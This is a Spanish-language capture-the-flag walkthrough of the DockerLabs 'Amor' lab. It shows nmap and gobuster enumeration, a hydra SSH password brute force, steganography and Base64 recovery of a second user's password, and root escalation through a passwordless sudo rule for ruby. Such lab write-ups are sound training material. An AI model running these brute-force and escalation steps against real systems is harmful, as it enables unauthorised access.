---
title: "DockerLabs - Amor"
difficulty: "Fácil"
source: "DockerLabs"
---

Laboratorio para practicar enumeración web, fuerza bruta SSH con Hydra y escalada de privilegios en Linux.

## Despliegue

```bash
bash auto_deploy.sh amor.tar
```

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

Puertos detectados:
- **22/tcp** — SSH (OpenSSH)
- **80/tcp** — HTTP (Apache)

## Enumeración Web

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,txt,html
```

Gobuster devuelve un JavaScript no accesible. En la página web se identifica un usuario: **`carlota`**.

## Intrusión — carlota

Fuerza bruta SSH con Hydra:

```bash
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```

Credenciales: `carlota:babygirl`

```bash
ssh carlota@172.17.0.2
```

## Movimiento Lateral — oscar

En el home de carlota se encuentra:

```
/home/carlota/Desktop/fotos/vacaiones/imagen.jpg
```

Se extrae contenido oculto con steghide (passphrase vacía):

```bash
scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaiones/imagen.jpg ~
steghide extract -sf imagen.jpg -p ""
```

Genera `secret.txt` con contenido en Base64:

```
ZXNsYWNhc2FkZXBpbnlwb24=
```

Decodificado:

```bash
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d
# lacasadepinypon
```

```bash
su oscar
# contraseña: lacasadepinypon
```

## Escalada de privilegios

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/ruby
```

Oscar puede ejecutar ruby como root. Escalada directa via GTFOBins:

```bash
sudo ruby -e "exec '/bin/bash'"
whoami
# root
```

## Conclusión

Cadena de ataque: enumeración web → usuario `carlota` en la web → hydra SSH → steganografía en imagen → base64 → contraseña de `oscar` → ruby sudo → root.

**Lecciones aprendidas:**
- La enumeración web puede revelar usernames directamente en el contenido de la página.
- Siempre revisar los archivos del home del usuario, especialmente imágenes.
- Base64 no es cifrado — se decodifica directamente sin necesidad de cracking.
- Ruby en sudoers sin contraseña equivale a root inmediato (`exec '/bin/bash'`).
